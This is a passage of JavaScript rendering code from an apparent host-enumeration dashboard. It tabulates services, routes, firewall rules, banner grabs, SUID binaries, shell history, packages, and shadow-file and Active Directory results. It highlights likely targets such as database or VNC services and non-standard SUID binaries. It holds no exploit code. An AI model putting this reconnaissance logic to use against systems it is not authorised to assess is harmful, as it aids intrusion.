    const INTERESTING_SVC = /sql|ftp|telnet|vnc|rdp|web|http|iis|apache|nginx|tomcat|backup/i;
    const running = allServices.filter(s => s.state === 'RUNNING' || s.state === 'ACTIVE' || s.state === 'active');
    const stopped = allServices.filter(s => s.state !== 'RUNNING' && s.state !== 'ACTIVE' && s.state !== 'active');

    if (running.length) {
      const runLabel = document.createElement('p');
      runLabel.className = 'text-xs font-semibold text-slate-500 uppercase tracking-wider mb-1';
      runLabel.textContent = `Running (${running.length})`;
      card.appendChild(runLabel);
      const table = document.createElement('table');
      table.className = 'w-auto text-xs font-mono mb-2';
      running.slice(0, 20).forEach(s => {
        const tr = document.createElement('tr');
        tr.className = 'border-t border-slate-100';
        const isInteresting = INTERESTING_SVC.test(s.name) || INTERESTING_SVC.test(s.displayName || '');
        const nameTd = document.createElement('td');
        nameTd.className = `py-0.5 pr-3 ${isInteresting ? 'text-amber-700 font-semibold' : 'text-slate-700'}`;
        nameTd.textContent = s.name;
        const dispTd = document.createElement('td');
        dispTd.className = 'py-0.5 pr-3 text-slate-500 truncate max-w-xs';
        dispTd.textContent = s.displayName ?? '';
        const stateTd = document.createElement('td');
        stateTd.className = 'py-0.5';
        const stateBadge = document.createElement('span');
        stateBadge.className = 'text-xs bg-green-100 text-green-700 px-1.5 py-0.5 rounded font-semibold';
        stateBadge.textContent = s.state;
        stateTd.appendChild(stateBadge);
        tr.appendChild(nameTd); tr.appendChild(dispTd); tr.appendChild(stateTd);
        table.appendChild(tr);
      });
      if (running.length > 20) {
        const tr = document.createElement('tr');
        const td = document.createElement('td');
        td.colSpan = 3; td.className = 'py-1 text-slate-400 text-xs';
        td.textContent = `…and ${running.length - 20} more`;
        tr.appendChild(td); table.appendChild(tr);
      }
      card.appendChild(table);
    }

    if (stopped.length) {
      const stopLabel = document.createElement('p');
      stopLabel.className = 'text-xs font-semibold text-slate-500 uppercase tracking-wider mb-1';
      stopLabel.textContent = `Stopped / Other (${stopped.length})`;
      card.appendChild(stopLabel);
      const table = document.createElement('table');
      table.className = 'w-auto text-xs font-mono';
      stopped.slice(0, 10).forEach(s => {
        const tr = document.createElement('tr');
        tr.className = 'border-t border-slate-100';
        const nameTd = document.createElement('td');
        nameTd.className = 'py-0.5 pr-3 text-slate-500';
        nameTd.textContent = s.name;
        const dispTd = document.createElement('td');
        dispTd.className = 'py-0.5 pr-3 text-slate-400 truncate max-w-xs';
        dispTd.textContent = s.displayName ?? '';
        const stateTd = document.createElement('td');
        stateTd.className = 'py-0.5';
        const stateClass = s.state === 'FAILED' ? 'bg-red-100 text-red-700' : 'bg-slate-100 text-slate-500';
        const stateBadge = document.createElement('span');
        stateBadge.className = `text-xs ${stateClass} px-1.5 py-0.5 rounded font-semibold`;
        stateBadge.textContent = s.state ?? 'STOPPED';
        stateTd.appendChild(stateBadge);
        tr.appendChild(nameTd); tr.appendChild(dispTd); tr.appendChild(stateTd);
        table.appendChild(tr);
      });
      if (stopped.length > 10) {
        const tr = document.createElement('tr');
        const td = document.createElement('td');
        td.colSpan = 3; td.className = 'py-1 text-slate-400 text-xs';
        td.textContent = `…and ${stopped.length - 10} more`;
        tr.appendChild(td); table.appendChild(tr);
      }
      card.appendChild(table);
    }
    return;
  }

  if (snap.commandType === 'routes') {
    const RFC1918 = /^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.)/;
    const routes = snap.parsed.routes || [];
    const label = document.createElement('p');
    label.className = 'text-xs font-semibold text-slate-500 uppercase tracking-wider mb-1';
    label.textContent = `Routes (${routes.length})`;
    card.appendChild(label);
    const table = document.createElement('table');
    table.className = 'w-auto text-xs font-mono';
    routes.slice(0, 20).forEach(r => {
      const tr = document.createElement('tr');
      tr.className = 'border-t border-slate-100';
      const destTd = document.createElement('td');
      destTd.className = `py-0.5 pr-3 ${r.isDefault ? 'font-bold text-indigo-700' : 'text-slate-600'}`;
      destTd.textContent = r.destination + (r.netmask ? ` / ${r.netmask}` : '');
      const gwTd = document.createElement('td');
      const gwIsPublic = r.gateway && r.gateway !== '0.0.0.0' && !RFC1918.test(r.gateway);
      gwTd.className = `py-0.5 pr-3 ${gwIsPublic ? 'text-amber-700 font-semibold' : 'text-slate-600'}`;
      gwTd.textContent = r.gateway ?? '—';
      const ifaceTd = document.createElement('td');
      ifaceTd.className = 'py-0.5 pr-3 text-slate-400';
      ifaceTd.textContent = r.iface ?? '';
      const metricTd = document.createElement('td');
      metricTd.className = 'py-0.5 text-slate-400';
      metricTd.textContent = r.metric != null ? String(r.metric) : '';
      tr.appendChild(destTd); tr.appendChild(gwTd); tr.appendChild(ifaceTd); tr.appendChild(metricTd);
      table.appendChild(tr);
    });
    if (routes.length > 20) {
      const tr = document.createElement('tr');
      const td = document.createElement('td');
      td.colSpan = 4; td.className = 'py-1 text-slate-400 text-xs';
      td.textContent = `…and ${routes.length - 20} more`;
      tr.appendChild(td); table.appendChild(tr);
    }
    card.appendChild(table);
    return;
  }

  if (snap.commandType === 'hostsfile') {
    const entries = snap.parsed.entries || [];
    const label = document.createElement('p');
    label.className = 'text-xs font-semibold text-slate-500 uppercase tracking-wider mb-1';
    label.textContent = `Custom host entries (${entries.length})`;
    card.appendChild(label);
    const table = document.createElement('table');
    table.className = 'w-auto text-xs font-mono';
    entries.slice(0, 20).forEach(e => {
      const tr = document.createElement('tr');
      tr.className = 'border-t border-slate-100';
      const ipTd = document.createElement('td');
      ipTd.className = 'py-0.5 pr-4 text-slate-500 w-36 flex-shrink-0';
      ipTd.textContent = e.ip;
      const hostsTd = document.createElement('td');
      hostsTd.className = 'py-0.5 text-slate-700';
      hostsTd.textContent = e.hosts.join(' ');
      tr.appendChild(ipTd); tr.appendChild(hostsTd);
      table.appendChild(tr);
    });
    if (entries.length > 20) {
      const tr = document.createElement('tr');
      const td = document.createElement('td');
      td.colSpan = 2; td.className = 'py-1 text-slate-400 text-xs';
      td.textContent = `…and ${entries.length - 20} more`;
      tr.appendChild(td); table.appendChild(tr);
    }
    card.appendChild(table);
    return;
  }

  if (snap.commandType === 'firewall') {
    const { rules, raw } = snap.parsed;
    if (rules && rules.length > 0) {
      for (const chainFilter of ['INPUT', 'OUTPUT', 'FORWARD', 'IN', 'OUT']) {
        const chainRules = rules.filter(r => r.chain === chainFilter || r.chain === chainFilter.toLowerCase());
        if (!chainRules.length) continue;
        const section = document.createElement('div');
        section.className = 'mb-3';
        const secLabel = document.createElement('p');
        secLabel.className = 'text-xs font-semibold text-slate-500 uppercase tracking-wider mb-1';
        secLabel.textContent = chainFilter + ` rules (${chainRules.length})`;
        section.appendChild(secLabel);
        const table = document.createElement('table');
        table.className = 'w-auto text-xs font-mono';
        chainRules.forEach(r => {
          const tr = document.createElement('tr');
          tr.className = 'border-t border-slate-100';
          const targetTd = document.createElement('td');
          const targetColor = /^ACCEPT$/i.test(r.target) ? 'text-green-700 font-semibold' : /^(DROP|REJECT)$/i.test(r.target) ? 'text-red-700 font-semibold' : 'text-slate-600';
          targetTd.className = `py-0.5 pr-3 ${targetColor}`;
          targetTd.textContent = r.target;
          const protoTd = document.createElement('td');
          protoTd.className = 'py-0.5 pr-3 text-slate-500';
          protoTd.textContent = r.proto ?? 'all';
          const srcTd = document.createElement('td');
          srcTd.className = 'py-0.5 pr-3 text-slate-600';
          srcTd.textContent = r.source ?? 'any';
          const dstTd = document.createElement('td');
          dstTd.className = 'py-0.5 pr-3 text-slate-600';
          dstTd.textContent = r.destination ?? 'any';
          const notesTd = document.createElement('td');
          notesTd.className = 'py-0.5 text-slate-400';
          notesTd.textContent = r.notes ?? '';
          tr.appendChild(targetTd); tr.appendChild(protoTd); tr.appendChild(srcTd); tr.appendChild(dstTd); tr.appendChild(notesTd);
          table.appendChild(tr);
        });
        section.appendChild(table);
        card.appendChild(section);
      }
    } else if (raw) {
      const pre = document.createElement('pre');
      pre.className = 'font-mono text-xs bg-slate-50 rounded p-2 max-h-48 overflow-y-auto border border-slate-200 whitespace-pre-wrap';
      pre.textContent = raw;
      card.appendChild(pre);
    }
    return;
  }

  if (snap.commandType === 'bannergrab') {
    const p = snap.parsed;
    // Service badge
    const badgeRow = document.createElement('div');
    badgeRow.className = 'flex items-center gap-2 mb-2';
    const svcBadge = document.createElement('span');
    const svcColor = p.service === 'HTTP' || p.service === 'HTTPS' ? 'bg-blue-100 text-blue-700'
                   : p.service === 'SSH'  ? 'bg-green-100 text-green-700'
                   : p.service === 'FTP'  ? 'bg-amber-100 text-amber-700'
                   : p.service === 'SMTP' ? 'bg-slate-100 text-slate-700'
                   : 'bg-slate-100 text-slate-500';
    svcBadge.className = `text-xs font-semibold px-2 py-0.5 rounded ${svcColor}`;
    svcBadge.textContent = p.service;
    badgeRow.appendChild(svcBadge);
    if (p.statusCode) {
      const codeBadge = document.createElement('span');
      const codeColor = p.statusCode < 300 ? 'bg-green-100 text-green-700' : p.statusCode < 400 ? 'bg-blue-100 text-blue-700' : 'bg-red-100 text-red-700';
      codeBadge.className = `text-xs font-mono font-semibold px-2 py-0.5 rounded ${codeColor}`;
      codeBadge.textContent = p.statusCode;
      badgeRow.appendChild(codeBadge);
    }
    card.appendChild(badgeRow);
    if (p.version) {
      const vEl = document.createElement('p');
      vEl.className = 'text-sm text-slate-700 font-mono mb-2';
      vEl.textContent = p.version;
      card.appendChild(vEl);
    }
    // HTTP headers
    if (Object.keys(p.headers || {}).length) {
      const headerTable = document.createElement('table');
      headerTable.className = 'w-auto text-xs font-mono mb-2';
      for (const [k, v] of Object.entries(p.headers)) {
        const tr = document.createElement('tr');
        tr.className = 'border-t border-slate-100';
        const kTd = document.createElement('td');
        kTd.className = 'py-0.5 pr-3 text-slate-400 w-36';
        kTd.textContent = k;
        const vTd = document.createElement('td');
        vTd.className = 'py-0.5 text-slate-700';
        vTd.textContent = v;
        tr.appendChild(kTd); tr.appendChild(vTd);
        headerTable.appendChild(tr);
      }
      card.appendChild(headerTable);
    }
    // Raw collapsible
    const details = document.createElement('details');
    details.className = 'mt-2';
    const summary = document.createElement('summary');
    summary.className = 'text-xs text-slate-400 cursor-pointer select-none hover:text-slate-600';
    summary.textContent = 'Raw banner';
    const pre = document.createElement('pre');
    pre.className = 'font-mono text-xs bg-slate-50 rounded p-2 mt-1 max-h-32 overflow-y-auto border border-slate-200 whitespace-pre-wrap';
    pre.textContent = p.raw;
    details.appendChild(summary);
    details.appendChild(pre);
    card.appendChild(details);
    return;
  }

  if (snap.commandType === 'suid') {
    const binaries = snap.parsed.binaries || [];
    const nonStandard = binaries.filter(b => b.isNonStandard);
    if (nonStandard.length === 0) {
      const ok = document.createElement('p');
      ok.className = 'text-xs text-green-700 bg-green-50 rounded px-2 py-1 font-mono';
      ok.textContent = 'All standard system binaries.';
      card.appendChild(ok);
    } else {
      const warn = document.createElement('p');
      warn.className = 'text-xs text-amber-700 bg-amber-50 rounded px-2 py-1 mb-2 font-mono';
      warn.textContent = `${nonStandard.length} non-standard SUID ${nonStandard.length === 1 ? 'binary' : 'binaries'} detected.`;
      card.appendChild(warn);
    }
    const label = document.createElement('p');
    label.className = 'text-xs font-semibold text-slate-500 uppercase tracking-wider mb-1 mt-2';
    label.textContent = `SUID binaries (${binaries.length})`;
    card.appendChild(label);
    const table = document.createElement('table');
    table.className = 'w-auto text-xs font-mono';
    binaries.slice(0, 20).forEach(b => {
      const tr = document.createElement('tr');
      tr.className = 'border-t border-slate-100' + (b.isNonStandard ? ' bg-amber-50' : '');
      const pathTd = document.createElement('td');
      pathTd.className = `py-0.5 pr-3 ${b.isNonStandard ? 'text-amber-700' : 'text-slate-600'}`;
      pathTd.textContent = b.path;
      const badgeTd = document.createElement('td');
      badgeTd.className = 'py-0.5';
      const badge = document.createElement('span');
      badge.className = `text-xs px-1.5 py-0.5 rounded ${b.isNonStandard ? 'bg-amber-100 text-amber-700 font-semibold' : 'bg-slate-100 text-slate-500'}`;
      badge.textContent = b.isNonStandard ? 'non-standard' : 'standard';
      badgeTd.appendChild(badge);
      tr.appendChild(pathTd); tr.appendChild(badgeTd);
      table.appendChild(tr);
    });
    if (binaries.length > 20) {
      const tr = document.createElement('tr');
      const td = document.createElement('td');
      td.colSpan = 2; td.className = 'py-1 text-slate-400 text-xs';
      td.textContent = `…and ${binaries.length - 20} more`;
      tr.appendChild(td); table.appendChild(tr);
    }
    card.appendChild(table);
    return;
  }

  if (snap.commandType === 'history') {
    const commands = snap.parsed.commands || [];
    const interesting = commands.filter(c => c.isInteresting);
    const label = document.createElement('p');
    label.className = 'text-xs font-semibold text-slate-500 uppercase tracking-wider mb-1';
    label.textContent = `Command history (${commands.length})${interesting.length ? ` — ${interesting.length} interesting` : ''}`;
    card.appendChild(label);
    // Show interesting first
    const display = [...commands.filter(c => c.isInteresting).slice(0, 10), ...commands.filter(c => !c.isInteresting)].slice(0, 30);
    const table = document.createElement('table');
    table.className = 'w-auto text-xs font-mono';
    display.forEach(c => {
      const tr = document.createElement('tr');
      tr.className = 'border-t border-slate-100';
      const cmdTd = document.createElement('td');
      cmdTd.className = `py-0.5 ${c.isInteresting ? 'text-amber-700' : 'text-slate-600'} truncate max-w-sm`;
      cmdTd.textContent = (c.isInteresting ? '⚡ ' : '') + c.cmd;
      cmdTd.title = c.cmd;
      tr.appendChild(cmdTd);
      table.appendChild(tr);
    });
    if (commands.length > 30) {
      const tr = document.createElement('tr');
      const td = document.createElement('td');
      td.className = 'py-1 text-slate-400 text-xs';
      td.textContent = `…and ${commands.length - 30} more`;
      tr.appendChild(td); table.appendChild(tr);
    }
    card.appendChild(table);
    return;
  }

  if (snap.commandType === 'software') {
    const packages = snap.parsed.packages || [];
    const label = document.createElement('p');
    label.className = 'text-xs font-semibold text-slate-500 uppercase tracking-wider mb-1';
    label.textContent = `Installed packages (${packages.length})`;
    card.appendChild(label);
    const table = document.createElement('table');
    table.className = 'w-auto text-xs font-mono';
    packages.slice(0, 20).forEach(pkg => {
      const tr = document.createElement('tr');
      tr.className = 'border-t border-slate-100';
      const nameTd = document.createElement('td');
      nameTd.className = 'py-0.5 pr-3 text-slate-700';
      nameTd.textContent = pkg.name;
      const verTd = document.createElement('td');
      verTd.className = 'py-0.5 pr-3 text-slate-500';
      verTd.textContent = pkg.version ?? '';
      const archTd = document.createElement('td');
      archTd.className = 'py-0.5 text-slate-400';
      archTd.textContent = pkg.arch ?? '';
      tr.appendChild(nameTd); tr.appendChild(verTd); tr.appendChild(archTd);
      table.appendChild(tr);
    });
    if (packages.length > 20) {
      const tr = document.createElement('tr');
      const td = document.createElement('td');
      td.colSpan = 3; td.className = 'py-1 text-slate-400 text-xs';
      td.textContent = `…and ${packages.length - 20} more`;
      tr.appendChild(td); table.appendChild(tr);
    }
    card.appendChild(table);
    return;
  }
}

function formatDiffItems(type, items) {
  if (type === 'netstat')     return items.slice(0, 3).map(c => `${c.proto} :${c.localPort}`).join(', ');
  if (type === 'pslist')      return items.slice(0, 5).map(p => p.name).join(', ');
  if (type === 'arp')         return items.slice(0, 3).map(e => `${e.ip} (${e.mac})`).join(', ');
  if (type === 'ipconfig')    return items.slice(0, 3).join(', ');
  if (type === 'localadmins') return items.slice(0, 3).map(m => m.name).join(', ');
  if (type === 'sessions')    return items.slice(0, 3).map(s => s.username ?? s.sessionName ?? s.id).join(', ');
  if (type === 'passwd')      return items.slice(0, 3).map(u => u.username).join(', ');
  if (type === 'shadow')      return items.slice(0, 3).map(e => e.username).join(', ');
  if (type === 'lastlog')     return items.slice(0, 3).map(e => e.username).join(', ');
  if (type === 'netshare')           return items.slice(0, 3).map(s => s.name).join(', ');
  if (type === 'addomaincontrollers') return items.slice(0, 3).map(dc => dc.hostname ?? dc.name).join(', ');
  if (type === 'adtrusts')           return items.slice(0, 3).map(t => t.targetDomain).join(', ');
  if (type === 'adous')              return items.slice(0, 3).map(ou => ou.name).join(', ');
  if (type === 'adcs')               return items.slice(0, 3).map(ca => ca.name).join(', ');
  return '';
}
